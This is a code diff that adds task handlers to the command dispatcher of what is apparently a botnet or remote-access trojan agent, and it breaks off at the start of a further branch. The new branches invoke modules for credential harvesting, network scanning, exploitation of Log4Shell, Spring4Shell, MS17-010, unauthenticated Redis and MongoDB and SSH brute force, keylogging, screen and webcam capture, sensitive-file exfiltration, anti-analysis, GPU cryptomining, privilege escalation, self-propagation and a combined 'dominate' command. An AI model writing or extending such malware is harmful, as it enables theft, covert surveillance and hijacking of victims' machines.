@@ -1236,6 +1236,246 @@ def execute_task(task):
                 shell=True, timeout=10
             ).decode(errors="replace")
 
+        # ─── NEW MODULES INTEGRATION ────────────────────────────────────────
+        elif tt == "harvest_creds":
+            # Credential Harvester
+            try:
+                from .credential_harvester import CredentialHarvester
+                harvester = CredentialHarvester()
+                creds = harvester.harvest_all()
+                result = json.dumps(creds, indent=2, default=str)
+            except ImportError:
+                result = "credential_harvester module not available"
+            except Exception as e:
+                result = f"Credential harvest error: {e}"
+
+        elif tt == "network_scan":
+            # Network Scanner
+            try:
+                from .network_scanner import NetworkScanner
+                scanner = NetworkScanner()
+                subnet = payload.strip() if payload else None
+                scan_result = scanner.quick_scan(subnet) if payload else scanner.full_scan(subnet)
+                result = json.dumps(scan_result, indent=2, default=str)
+            except ImportError:
+                result = "network_scanner module not available"
+            except Exception as e:
+                result = f"Network scan error: {e}"
+
+        elif tt == "exploit":
+            # Exploit Engine
+            try:
+                from .exploit_engine import ExploitEngine
+                engine = ExploitEngine()
+                # Parse payload: target_ip:port:exploit_type
+                parts = payload.split(":")
+                if len(parts) >= 2:
+                    target_ip = parts[0]
+                    target_port = int(parts[1])
+                    exploit_type = parts[2] if len(parts) > 2 else "log4shell"
+                    
+                    if exploit_type == "log4shell":
+                        exploit_result = engine.exploit_log4shell(target_ip, target_port)
+                    elif exploit_type == "spring4shell":
+                        exploit_result = engine.exploit_spring4shell(target_ip, target_port)
+                    elif exploit_type == "redis":
+                        exploit_result = engine.exploit_redis_unauth(target_ip, target_port)
+                    elif exploit_type == "mongodb":
+                        exploit_result = engine.exploit_mongodb_unauth(target_ip, target_port)
+                    elif exploit_type == "ssh":
+                        exploit_result = engine.exploit_ssh_brute(target_ip, target_port)
+                    elif exploit_type == "smb":
+                        exploit_result = engine.exploit_smb_ms17_010(target_ip, target_port)
+                    else:
+                        exploit_result = engine.exploit_log4shell(target_ip, target_port)
+                    
+                    result = json.dumps(exploit_result, indent=2, default=str)
+                else:
+                    result = "Usage: target_ip:port:exploit_type"
+            except ImportError:
+                result = "exploit_engine module not available"
+            except Exception as e:
+                result = f"Exploit error: {e}"
+
+        elif tt == "keylog_start":
+            # Start Keylogger
+            try:
+                from .keylogger import Keylogger
+                output_file = payload.strip() if payload else None
+                kl = Keylogger(output_file)
+                kl.start()
+                result = f"Keylogger started, output: {kl.output_file}"
+            except ImportError:
+                result = "keylogger module not available"
+            except Exception as e:
+                result = f"Keylogger error: {e}"
+
+        elif tt == "screen_capture":
+            # Screen Capture
+            try:
+                from .screen_capture import ScreenCapture
+                capture = ScreenCapture()
+                filepath = capture.screenshot()
+                if filepath:
+                    with open(filepath, "rb") as f:
+                        result = f"[b64:{filepath}] " + b64encode(f.read()).decode()
+                else:
+                    result = "Screenshot failed"
+            except ImportError:
+                result = "screen_capture module not available"
+            except Exception as e:
+                result = f"Screen capture error: {e}"
+
+        elif tt == "webcam_capture":
+            # Webcam Capture
+            try:
+                from .screen_capture import ScreenCapture
+                capture = ScreenCapture()
+                filepath = capture.webcam_capture()
+                if filepath:
+                    with open(filepath, "rb") as f:
+                        result = f"[b64:{filepath}] " + b64encode(f.read()).decode()
+                else:
+                    result = "Webcam capture failed"
+            except ImportError:
+                result = "screen_capture module not available"
+            except Exception as e:
+                result = f"Webcam error: {e}"
+
+        elif tt == "exfil":
+            # File Exfiltration
+            try:
+                from .file_exfil import FileExfiltration
+                exfil = FileExfiltration()
+                filepath = payload.strip()
+                if filepath:
+                    exfil_result = exfil.send_file(filepath)
+                    result = json.dumps(exfil_result, indent=2, default=str)
+                else:
+                    # Find and exfil sensitive files
+                    exfil_result = exfil.exfiltrate_sensitive()
+                    result = json.dumps(exfil_result, indent=2, default=str)
+            except ImportError:
+                result = "file_exfil module not available"
+            except Exception as e:
+                result = f"Exfil error: {e}"
+
+        elif tt == "anti_analysis":
+            # Anti-Analysis Check
+            try:
+                from .anti_analysis import AntiAnalysis
+                anti = AntiAnalysis()
+                check_result = anti.check_all()
+                result = json.dumps(check_result, indent=2, default=str)
+            except ImportError:
+                result = "anti_analysis module not available"
+            except Exception as e:
+                result = f"Anti-analysis error: {e}"
+
+        elif tt == "gpu_mining_start":
+            # Start GPU Mining
+            try:
+                from .gpu_mining import GPUMining
+                miner = GPUMining()
+                mining_result = miner.start(gpu=True)
+                result = json.dumps(mining_result, indent=2, default=str)
+            except ImportError:
+                result = "gpu_mining module not available"
+            except Exception as e:
+                result = f"GPU mining error: {e}"
+
+        elif tt == "gpu_mining_stop":
+            # Stop GPU Mining
+            try:
+                from .gpu_mining import GPUMining
+                miner = GPUMining()
+                mining_result = miner.stop()
+                result = json.dumps(mining_result, indent=2, default=str)
+            except ImportError:
+                result = "gpu_mining module not available"
+            except Exception as e:
+                result = f"GPU mining error: {e}"
+
+        elif tt == "priv_esc":
+            # Privilege Escalation
+            try:
+                from .privilege_escalation import PrivilegeEscalation
+                priv = PrivilegeEscalation()
+                if payload == "auto":
+                    esc_result = priv.auto_exploit()
+                else:
+                    esc_result = priv.enumerate()
+                result = json.dumps(esc_result, indent=2, default=str)
+            except ImportError:
+                result = "privilege_escalation module not available"
+            except Exception as e:
+                result = f"Privilege escalation error: {e}"
+
+        elif tt == "propagate":
+            # Auto-propagation using network scanner + exploit engine
+            try:
+                from .network_scanner import NetworkScanner
+                from .exploit_engine import ExploitEngine
+                
+                scanner = NetworkScanner()
+                engine = ExploitEngine()
+                
+                # Scan network
+                scan_result = scanner.full_scan()
+                targets = scanner.results.get("potential_targets", [])
+                
+                # Exploit targets
+                if targets:
+                    exploit_results = engine.auto_exploit(targets)
+                    result = json.dumps({
+                        "hosts_found": len(scan_result.get("hosts_alive", [])),
+                        "targets": len(targets),
+                        "exploited": len(exploit_results.get("exploited", [])),
+                        "details": exploit_results
+                    }, indent=2, default=str)
+                else:
+                    result = json.dumps({
+                        "hosts_found": len(scan_result.get("hosts_alive", [])),
+                        "targets": 0,
+                        "exploited": 0
+                    }, indent=2, default=str)
+            except ImportError as e:
+                result = f"Propagation modules not available: {e}"
+            except Exception as e:
+                result = f"Propagation error: {e}"
+
+        elif tt == "dominate":
+            # Full domination: creds + mining + propagation
+            results = {}
+            
+            # Harvest credentials
+            try:
+                from .credential_harvester import CredentialHarvester
+                harvester = CredentialHarvester()
+                results["credentials"] = harvester.harvest_all()["summary"]
+            except:
+                results["credentials"] = "failed"
+            
+            # Start mining
+            try:
+                from .gpu_mining import GPUMining
+                miner = GPUMining()
+                miner.start(gpu=True)
+                results["mining"] = "started"
+            except:
+                results["mining"] = "failed"
+            
+            # Propagate
+            try:
+                from .network_scanner import NetworkScanner
+                scanner = NetworkScanner()
+                scanner.quick_scan()
+                results["propagation"] = f"{len(scanner.results.get('hosts_alive', []))} hosts found"
+            except:
+                results["propagation"] = "failed"
+            
+            result = json.dumps(results, indent=2, default=str)
+
         elif tt == "propagate":
             # Run propagation routine
             try:
